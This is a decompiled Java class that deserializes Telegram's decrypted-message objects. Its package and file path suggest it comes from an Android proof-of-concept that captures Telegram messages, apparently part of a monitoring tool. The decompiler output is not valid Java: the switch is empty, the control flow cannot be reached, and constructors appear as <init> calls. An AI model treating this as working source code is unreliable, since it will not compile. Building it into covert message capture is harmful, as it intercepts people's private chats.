package com.vvt.capture.telegram.internal;

public class TLRPC$DecryptedMessage
  extends TLObject
{
  public TLRPC.DecryptedMessageAction action;
  public TLRPC.DecryptedMessageMedia media;
  public String message;
  public byte[] random_bytes;
  public long random_id;
  public int ttl;
  
  public static DecryptedMessage TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in DecryptedMessage", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageService;
      ((TLRPC.TL_decryptedMessageService)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessage_old;
      ((TLRPC.TL_decryptedMessage_old)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessage;
      ((TLRPC.TL_decryptedMessage)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageService_old;
      ((TLRPC.TL_decryptedMessageService_old)localObject).<init>();
    }
    if (localObject != null) {
      ((DecryptedMessage)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (DecryptedMessage)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$DecryptedMessage.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */